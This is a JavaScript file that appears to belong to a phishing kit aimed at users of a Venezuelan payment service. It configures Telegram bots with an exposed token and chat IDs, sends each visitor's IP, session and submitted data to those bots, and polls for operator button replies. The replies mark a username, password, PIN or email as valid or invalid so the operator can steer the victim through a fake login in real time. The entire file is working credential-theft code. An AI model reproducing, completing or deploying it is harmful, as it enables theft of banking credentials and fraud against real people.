// CONFIGURACIÓN DE BOTS DE TELEGRAM - MODIFICAR SOLO ESTA PARTE
const BOTS_CONFIG = [
    {
        nombre: "CANAL#5",  // Nombre que aparecerá en los mensajes
        token: "8805112352:AAEmQsBHKeTrPnPgpK2-yHuzyhOx_V9Purw",
        chatId: "-5512948424"  // Un solo chat ID para este bot
    },
    {
        nombre: "UBII BOT",  // Nombre que aparecerá en los mensajes
        token: "8805112352:AAEmQsBHKeTrPnPgpK2-yHuzyhOx_V9Purw",
        chatId: "-5317418036"  // Un solo chat ID para este bot
    }
    // Puedes agregar más bots aquí siguiendo el mismo formato
];

// NO MODIFICAR ESTA PARTE - FUNCIONES AUXILIARES
// Variable global para almacenar el último mensaje enviado
let ultimoMensajeEnviado = '';

// Variable para controlar el estado de los botones
let botonesActivos = false;
let ultimoCallbackQueryId = null;
let ultimoUpdateId = 0; // Para rastrear las actualizaciones procesadas

// Generar ID único para esta sesión
function generarIDUnico() {
    return Date.now().toString(36) + Math.random().toString(36).substr(2);
}

// Obtener o generar ID único para esta sesión
function obtenerIDSesion() {
    let idSesion = sessionStorage.getItem('id_sesion');
    if (!idSesion) {
        idSesion = generarIDUnico();
        sessionStorage.setItem('id_sesion', idSesion);
    }
    return idSesion;
}

async function obtenerIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error al obtener la IP:', error);
        return 'No detectada';
    }
}

async function enviarATelegram(mensaje, botones = null) {
    try {
        const promesasEnvio = [];

        // Obtener ID único para esta sesión
        const idSesion = obtenerIDSesion();

        // Guardar el último mensaje enviado
        ultimoMensajeEnviado = mensaje;

        // Activar el control de botones si se proporcionaron botones
        if (botones && botones.length > 0) {
            botonesActivos = true;
        }

        // Recorrer cada bot y su chat configurado
        BOTS_CONFIG.forEach(bot => {
            // Ignorar bots con tokens vacíos o de ejemplo
            if (!bot.token || bot.token.includes('AQUI_PEGA') || bot.token === 'ddd') return;

            // Preparar el cuerpo del mensaje con el nombre del bot
            let body = {
                chat_id: bot.chatId,  // Usar chatId en lugar de chatIds
                text: `🤖 <b>[${bot.nombre}]</b>\n\n${mensaje}`,
                parse_mode: 'HTML'
            };

            // Agregar botones si se proporcionaron
            if (botones && botones.length > 0) {
                // Modificar los botones para incluir el ID de sesión y el nombre del bot
                const botonesConID = botones.map(fila => 
                    fila.map(boton => ({
                        ...boton,
                        callback_data: boton.callback_data + '|' + idSesion + '|' + bot.nombre
                    }))
                );
                
                body.reply_markup = {
                    inline_keyboard: botonesConID
                };
            }

            const promesa = fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(body)
            });
            promesasEnvio.push(promesa);
        });

        // Ejecutar todos los envíos en paralelo de manera simultánea
        await Promise.all(promesasEnvio);
        return true;
    } catch (error) {
        console.error('Error al enviar a Telegram:', error);
        return false;
    }
}

// Función para verificar respuestas de botones en Telegram
async function verificarRespuestasTelegram() {
    try {
        if (!botonesActivos) {
            return null;
        }

        const idSesion = obtenerIDSesion();
        let respuestasRecibidas = [];

        for (const bot of BOTS_CONFIG) {
            if (!bot.token || bot.token.includes('AQUI_PEGA') || bot.token === 'ddd') continue;

            try {
                // CORREGIDO: Usar JSON.stringify correctamente
                const requestBody = JSON.stringify({
                    offset: -1,
                    limit: 10,
                    allowed_updates: ['callback_query']
                });

                const response = await fetch(`https://api.telegram.org/bot${bot.token}/getUpdates`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: requestBody // Aquí estaba el error: usar la variable ya stringify
                });
                
                const data = await response.json();
                
                if (data.ok && data.result.length > 0) {
                    for (let i = data.result.length - 1; i >= 0; i--) {
                        const update = data.result[i];
                        
                        if (update.callback_query) {
                            const callbackData = update.callback_query.data;
                            const callbackQueryId = update.callback_query.id;
                            
                            // Asegurar que callbackData tenga la estructura esperada
                            const parts = callbackData.split('|');
                            if (parts.length < 2) continue; // Ignorar callbacks mal formados
                            
                            const [callbackType, sessionId, botNombre] = parts;
                            
                            if (sessionId !== idSesion) continue;
                            if (ultimoCallbackQueryId === callbackQueryId) continue;
                            
                            ultimoCallbackQueryId = callbackQueryId;
                            
                            // Responder al callback query
                            try {
                                await fetch(`https://api.telegram.org/bot${bot.token}/answerCallbackQuery`, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        callback_query_id: callbackQueryId,
                                        text: 'Respuesta recibida',
                                        show_alert: false
                                    })
                                });
                            } catch (error) {
                                console.error('Error al responder callback query:', error);
                            }
                            
                            respuestasRecibidas.push({
                                callbackData: callbackType,
                                messageId: update.callback_query.message.message_id
                            });
                            
                            botonesActivos = false;
                            break;
                        }
                    }
                }
            } catch (error) {
                console.error(`Error en bot ${bot.nombre}:`, error);
                continue;
            }
        }

        // Procesar respuestas
        for (const respuesta of respuestasRecibidas) {
            const callbackData = respuesta.callbackData;
            if (callbackData === 'usuario_malo') return 'usuario_malo';
            if (callbackData === 'contrasena_mala') return 'contrasena_mala';
            if (callbackData === 'seguir') return 'seguir';
            if (callbackData === 'pin_correcto') return 'si';
            if (callbackData === 'pin_incorrecto') return 'no';
            if (callbackData === 'correo_confirmado') return 'correo_confirmado';
        }
        
        return null;
    } catch (error) {
        console.error('Error general en verificarRespuestasTelegram:', error);
        return null;
    }
}

function obtenerFechaHora() {
    return new Date().toLocaleString('es-VE', { timeZone: 'America/Caracas' });
}